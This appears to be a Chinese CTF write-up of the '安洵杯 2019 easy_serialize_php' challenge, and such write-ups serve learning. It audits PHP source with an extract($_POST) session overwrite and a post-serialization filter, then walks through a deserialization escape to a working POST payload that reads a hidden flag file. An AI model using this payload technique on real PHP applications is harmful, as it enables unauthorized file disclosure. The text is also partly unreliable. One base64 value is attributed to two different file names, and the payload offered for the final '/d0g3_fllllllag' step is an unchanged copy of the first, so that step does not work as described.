# \[安洵杯 2019]easy\_serialize\_php

## \[安洵杯 2019]easy\_serialize\_php

## 考点

* 代码审计
* extract对session进行变量覆盖
* php反序列化逃逸

## wp

给了源码，先搞明白代码的逻辑

filter 函数将 `$img` 中含有的 数组中的元素 替换为 空，正则为 `/php|flag|php5|php4|fl1g/i`

```php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
```

GET传入`f`参数作为`function`，然后给session初始化，看到 `extract($_POST);` 说明有变量覆盖

```php
$function = @$_GET['f'];
$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
extract($_POST);
if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}
```

传入`img_path`，如果`img_path`为空，就`base64_encode`字符串`guest_img.png`否则就先`base64_encode` `img_path` 再 sha1 加密

```php
if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}
```

然后就是对 session 进行序列化并执行 filter 函数，这里就会存在字符逃逸了

```php
$serialize_info = filter(serialize($_SESSION));
```

最后是对 `$_GET['f']` 的判断，执行不同功能

```php
if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

提示看phpinfo，在里面发现`auto_append_file d0g3_f1ag.php`，说明要看d0g3\_f1ag.php。且`session.serialize_handler`为`php`

![](<../../.gitbook/assets/image (27) (1) (1) (1).png>)

现在的目的很明确，就是要读取`d0g3_f1ag.php`这个文件，利用逃逸使 session 中的 img 字段为 `ZDBnM19mMWFnLnBocA==` 即 `base64_encode(d0g3_f1ag.php)` ，然后在 `show_image` 中读取。

由于 `extract($_POST)` 的存在，可以利用变量覆盖修改 `$_SESSION["user"]`，`$_SESSION['function']` 和 `$function`，或者是在 `_SESSION` 中插入参数

先看一个正常的 session 文件经过序列化之后的结果，user 和 function 字段是可控的 `a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`

这里就有两个位置可以逃逸，先看一下 function 这里 `a:3:{s:4:"user";s:5:"guest";s:8:"function";s:7:"`<mark style="color:red;">`aphpphp`</mark>`";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`

filter 处理之后 `a:3:{s:4:"user";s:5:"guest";s:8:"function";s:7:"`<mark style="color:red;">`a";s:3:`</mark>`"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`

我们的目标如下，发现只有 function行不通，覆盖掉 img 字段后，无法控制 object 的注入，就考虑结合 user 一起 `a:3:{s:4:"user";s:5:"guest";s:8:"function";s:39:"`<mark style="color:red;">`a";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==`</mark>`";s:6:"object";s:6:"inject";}`

变成如下这样 {1} {2} 为可控输入，要注入对象的话，{2} 的内容长度一定会大于 10，所以考虑覆盖掉 `";s:8:"function";s:10:"` ，长度为 23，扩展成 3 或 4 的倍数( 根据 filter 函数)，就是 `";s:8:"function";s:10:"a`

`a:3:{s:4:"user";s:5:"`<mark style="color:red;">`{1}`</mark>`";s:8:"function";s:10:"`<mark style="color:green;">`{2}`</mark>`";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`

这就变成这个样子 `a:3:{s:4:"user";s:24:"`<mark style="color:red;">`flagflagflagflagflagflag`</mark>`";s:8:"function";s:10:"a{2}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`

经过 filter 函数处理

`a:3:{s:4:"user";s:24:"`<mark style="color:red;">`";s:8:"function";s:10:"a`</mark>`{2}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`

然后就是 {2} 的输入内容，要让 img 字段为 `ZDBnM19mMWFnLnBocA==` 即 `base64_encode(f1ag_a8f7b5e6.php)` ，还要闭合前面的 `"`，那么 {2} 就是 `";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";`

`a:3:{s:4:"user";s:24:"`<mark style="color:red;">`";s:8:"function";s:10:"a`</mark><mark style="color:green;">`";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";`</mark><mark style="color:yellow;">`";`</mark>`s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`

这样还存在问题，黄色部分的`";` 如何处理，可以结合 php 反序列化在`}`后的数据将直接被丢弃这个特点，直接构造一个结束符。{2} 为 `";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`

`a:3:{s:4:"user";s:24:"`<mark style="color:red;">`";s:8:"function";s:10:"a`</mark><mark style="color:green;">`";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`</mark><mark style="color:yellow;">`";`</mark>`s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`

这还有一个问题，这个反序列化之后的数组应该有 3 个元素，这样构造只剩下 2 个，这就需要再加一个元素，随便加即可

`a:3:{s:4:"user";s:24:"`<mark style="color:red;">`";s:8:"function";s:10:"a`</mark><mark style="color:green;">`";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:1:"a";}`</mark><mark style="color:yellow;">`";`</mark>`s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`

payload

```
POST
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:1:"a";}&function=show_image
```

![](<../../.gitbook/assets/image (9) (1) (1).png>)

再读取`/d0g3_fllllllag`，payload

```
POST
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:1:"a";}&function=show_image
```

## 小结

1. extract对session进行变量覆盖的条件是`session_start`在`extract`之前，参考[bestphp's revenge](bestphps-revenge.md)。
